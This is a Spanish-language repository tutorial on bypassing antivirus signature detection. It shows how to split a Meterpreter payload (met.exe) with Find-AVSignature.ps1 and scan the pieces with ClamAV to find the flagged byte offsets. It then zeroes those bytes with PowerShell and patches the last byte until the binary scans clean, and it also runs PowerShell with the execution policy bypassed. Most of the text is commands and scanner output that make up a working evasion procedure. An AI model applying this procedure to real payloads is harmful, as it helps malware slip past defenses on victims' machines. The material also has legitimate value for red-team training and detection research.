Uno de los métodos de detección de los AV se basan en las firmas de los ficheros; AV Signature Detection.
Este método de detección se basa en que existe un 'byte string' asociado a actividad maliciosa y si es detectado dentro de un fichero este es detectado como malicioso.

Una de las solucciónes que se aporta en este repositorio, consiste en:

- Intentar hacernos con una versión del antivirus que corre en la máquina objetivo.

- Realizar una partición del binario con *Find-AVSignature.ps1* module, el cual puede ser encontrado en este mismo repositorio con el siguiente comando.

    ```
    C:\Users\Offsec>powershell -ep bypass
    Windows PowerShell
    Copyright (C) Microsoft Corporation. All rights reserved.

    PS C:\Users\Offsec> Import-Module .\Find-AVSignature.ps1

    PS C:\Tools> Find-AVSignature -StartByte 0 -EndByte max -Interval 10000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest1 -Verbose -Force
    ```

- El comando anterior pasa los siguientes parámetros al Find-AVSignature:
    
    -> **StartByte**; El byte a comenzar el split.
    -> **EndByte**; El byte a finalizar el split.
    -> **Interval**; La cantidad de bytes que contendrá cada partición.
    -> **Path**; El binario a partir.
    -> **OutPath**; El directorio sobre el que mandar los ficheros que contendrán cada partición.
    -> **Verbose**; Exponer información por la terminal.
    -> **Force**; Ignorar errores.

- De esta forma, se generan un conjunto de ficheros en C:\Tools\avtest1 y se pasa ese directorio para ser escaneado por el antivirus de turno:

    ```
    PS C:\Program Files\ClamAV> .\clamscan.exe C:\Tools\avtest1
    LibClamAV Warning: **************************************************
    LibClamAV Warning: ***  The virus database is older than 7 days!  ***
    LibClamAV Warning: ***   Please update it as soon as possible.    ***
    LibClamAV Warning: **************************************************
    C:\Tools\avtest1\met_0.bin: Empty file
    C:\Tools\avtest1\met_10000.bin: OK
    C:\Tools\avtest1\met_20000.bin: Win.Trojan.Swrort-5710536-0 FOUND
    C:\Tools\avtest1\met_30000.bin: Win.Trojan.Swrort-5710536-0 FOUND
    C:\Tools\avtest1\met_40000.bin: Win.Trojan.Swrort-5710536-0 FOUND
    C:\Tools\avtest1\met_50000.bin: Win.Trojan.Swrort-5710536-0 FOUND
    C:\Tools\avtest1\met_60000.bin: Win.Trojan.Swrort-5710536-0 FOUND
    C:\Tools\avtest1\met_70000.bin: Win.Trojan.Swrort-5710536-0 FOUND
    C:\Tools\avtest1\met_73801.bin: Win.Trojan.Swrort-5710536-0 FOUND
    ```

- Ahora, se entiende que la detección comienza en el fichero 20000.bin, es decir, en algún byte de entre los 10000 y los 20000 bytes, así, se repite la partición anterior acotando a ese intervalo el split:

    ```
    PS C:\Tools> Find-AVSignature -StartByte 10000 -EndByte 20000 -Interval 1000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest1 -Verbose -Force
    ```

    Observemos que hemos reducido en una unidad de medida el tamaño del intervalo de 10000 a 1000. 

- Así, siguiendo con estas iteraciones y acotando sucesivamente los intervalos de detección llegaremos a un punto en el que detectemos exactamente cuál es el byte que provoca el error:

    ```
    PS C:\Program Files\ClamAV> .\clamscan.exe C:\Tools\avtest5
    C:\Tools\avtest5\met_18860.bin: OK
    C:\Tools\avtest5\met_18861.bin: OK
    C:\Tools\avtest5\met_18862.bin: OK
    C:\Tools\avtest5\met_18863.bin: OK
    C:\Tools\avtest5\met_18864.bin: OK
    C:\Tools\avtest5\met_18865.bin: OK
    C:\Tools\avtest5\met_18866.bin: OK
    C:\Tools\avtest5\met_18867.bin: Win.Trojan.Swrort-5710536-0 FOUND
    C:\Tools\avtest5\met_18868.bin: Win.Trojan.Swrort-5710536-0 FOUND
    C:\Tools\avtest5\met_18869.bin: Win.Trojan.Swrort-5710536-0 FOUND
    C:\Tools\avtest5\met_18870.bin: Win.Trojan.Swrort-5710536-0 FOUND
    ```

    En este caso se ve que el bytestring que provoca el signature comienza por el byte 18867.

- Ahora, alteramos este byte (o su precedente o su consecuente) con el siguiente código en powershell.

    ```powershell
    $bytes  = [System.IO.File]::ReadAllBytes("C:\Tools\met.exe")
    $bytes[18867] = 0
    [System.IO.File]::WriteAllBytes("C:\Tools\met_mod.exe", $bytes)
    ```

- Y repetimos el último paso del proceso anterior con el binario met_mod.exe:

    ```powershell
    PS C:\Program Files\ClamAV> Find-AVSignature -StartByte 18860 -EndByte 18870 -Interval 1 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest4 -Verbose -Force
    ```

    Y lo analizmos con el antivirus de turno, **si encontramos que no se ha soluccionado la detección, probamos a cambiar el byte precedente o el consecuente**.

- Este algoritmo de supressión de firmas se repite otra vez hasta que todas las particiones que conformen el binario salgan limpias, pueden aparecer uno o varios bytes strings que provoquen una alerta. Cada byte se incorpora al binario a través de powershell, por ejemplo;

    ```powershell
    $bytes  = [System.IO.File]::ReadAllBytes("C:\Tools\met.exe")
    $bytes[18867] = 0
    $bytes[18987] = 0
    ...
    [System.IO.File]::WriteAllBytes("C:\Tools\met_mod.exe", $bytes)
    ```

- Cuando todas las entradas de met_mod.exe salgan limpias, entonces se modifica el último byte del binario con el hexadecimal 0xFF, en este caso:

     ```powershell
    $bytes  = [System.IO.File]::ReadAllBytes("C:\Tools\met.exe")
    $bytes[18867] = 0
    $bytes[18987] = 0
    $bytes[73801] = 0xFF
    [System.IO.File]::WriteAllBytes("C:\Tools\met_mod.exe", $bytes)
    ```

- Y probamos el binario completo modificado en el antivirus.

    ```
    PS C:\Program Files\ClamAV> .\clamscan.exe C:\Tools\avtest14
    C:\Tools\avtest14\met_mod.exe: OK
    ```

**Es importante añadir que aunque este método bypasse correctamente la detección mediante firmas del AV, puede dejar inutilizado el binario y en ese caso, se debe de probar con otro método de bypass de detección**